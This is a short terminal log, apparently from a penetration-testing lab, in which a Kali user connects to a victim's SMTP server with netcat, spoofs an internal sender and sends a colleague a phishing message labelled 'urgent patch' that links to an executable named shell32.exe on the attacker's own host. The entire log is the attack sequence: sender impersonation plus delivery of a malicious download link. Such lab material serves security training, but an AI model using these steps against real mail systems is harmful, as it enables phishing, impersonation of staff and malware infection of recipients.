13.3.7.5
```
┌──(kali㉿kali)-[~]
└─$ nc -C 192.168.123.55 25       
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Wed, 30 Nov 2022 18:59:59 -0500 
helo victim
250 VICTIM Hello [192.168.119.123]
mail from:rmurray@victim
250 2.1.0 rmurray@victim....Sender OK
rcpt to:tharper@victim
250 2.1.5 tharper@victim 
data
354 Start mail input; end with <CRLF>.<CRLF>
urgent
patch
http://192.168.119.123/shell32.exe
.
250 2.6.0 <VICTIMvuQWboUog4hgJ00000001@VICTIM> Queued mail for delivery
quit
221 2.0.0 VICTIM Service closing transmission channel
```